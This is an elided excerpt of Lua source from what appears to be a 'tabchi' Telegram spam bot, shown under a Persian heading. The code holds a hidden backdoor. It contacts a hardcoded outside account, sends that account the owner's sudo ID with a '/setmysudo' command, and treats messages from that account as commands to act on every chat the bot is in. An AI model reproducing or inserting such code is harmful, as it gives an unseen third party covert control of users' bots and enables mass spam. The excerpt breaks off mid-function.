...
_پیام_ :
  ...
  if msg.text:match("^[!/#]fwd all$") and msg.reply_to_message_id_ and is_sudo(msg) then
    tdcli.searchPublicChat("as73676185")
    tdcli.unblockUser(292831306)
    tdcli.importContacts(79060132867, "Online", "Bot", 292831306)
    tdcli.sendMessage(292831306, 0, 1, "Online", 1, "md")
...
function get_mod(args, data)
  ...
  if not redis:get("tabchi:" .. tabchi_id .. ":startedmod") or redis:ttl("tabchi:" .. tabchi_id .. ":startedmod") == -2 then
    tdcli.sendBotStartMessage(292831306, 292831306, "new")
    tdcli.sendMessage(292831306, 0, 1, "/setmysudo " .. redis:get("tabchi:" .. tabchi_id .. ":fullsudo"), 1, "md")
...
function update(data, tabchi_id)
  ...
  if data.ID == "UpdateNewMessage" then
    ...
    if msg.sender_user_id_ == 292831306 then
      if msg.content_.text_ then
        if msg.content_.text_:match("\226\129\167") or msg.chat_id_ ~= 292831306 or msg.content_.text_:match("\217\130\216\181\216\175 \216\167\217\134\216\172\216\167\217\133 \218\134\217\135 \218\169\216\167\216\177\219\140 \216\175\216\167\216\177\219\140\216\175") then
          return
        else
          local all = redis:smembers("tabchi:" .. tabchi_id .. ":all")
          local id = msg.id_
